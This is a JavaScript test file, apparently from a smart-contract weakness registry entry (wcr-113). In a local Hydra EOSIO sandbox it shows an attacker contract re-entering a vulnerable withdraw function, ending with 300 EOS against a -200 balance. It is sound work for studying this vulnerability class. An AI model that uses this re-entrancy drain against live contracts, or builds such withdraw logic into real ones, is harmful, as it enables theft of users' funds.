const { loadConfig, Blockchain } = require("@klevoya/hydra");

const config = loadConfig("hydra.yml");

const eosStatsFixture = {
  EOS: [
    {
      supply: "100.0000 EOS",
      max_supply: "10000000000.0000 EOS",
      issuer: "eosio.token",
    },
  ],
};
describe("wcr-113", () => {
  let blockchain = new Blockchain(config);
  let vuln = blockchain.createAccount(`vulnerable`);
  let eosioToken = blockchain.createAccount(`eosio.token`);
  let attacker = blockchain.createAccount(`attacker`);

  beforeAll(async () => {
    vuln.setContract(blockchain.contractTemplates[`wcr-113`]);
    attacker.setContract(blockchain.contractTemplates[`wcr-113-attacker`]);
    eosioToken.setContract(blockchain.contractTemplates[`eosio.token`]);

    [vuln, attacker, eosioToken].forEach((acc) =>
      acc.updateAuth(`active`, `owner`, {
        accounts: [
          {
            permission: {
              actor: acc.accountName,
              permission: `eosio.code`,
            },
            weight: 1,
          },
        ],
      })
    );


    await eosioToken.loadFixtures(`stat`, eosStatsFixture);
    await eosioToken.loadFixtures(`accounts`, {
      [vuln.accountName]: [
        {
          balance: "1000.0000 EOS",
        },
      ],
      [attacker.accountName]: [
        {
          balance: "100.0000 EOS",
        },
      ],
    });
  });

  it("can re-enter", async () => {
    expect.assertions(2);

    await eosioToken.contract.transfer(
      {
        from: attacker.accountName,
        to: vuln.accountName,
        quantity: "100.0000 EOS",
        memo: "deposit",
      },
      [{ actor: attacker.accountName, permission: `active` }]
    );

    await vuln.contract.withdraw(
      {
        from: attacker.accountName,
        quantity: "100.0000 EOS",
      },
      [{ actor: attacker.accountName, permission: `active` }]
    );

    expect(eosioToken.getTableRowsScoped(`accounts`)[attacker.accountName]).toContainEqual(
      {
        balance: `300.0000 EOS`
      }
    );
    expect(vuln.getTableRowsScoped(`balances`)[vuln.accountName]).toContainEqual(
      {
        account: attacker.accountName,
        balance: `-200.0000 EOS`
      }
    );
  });
});
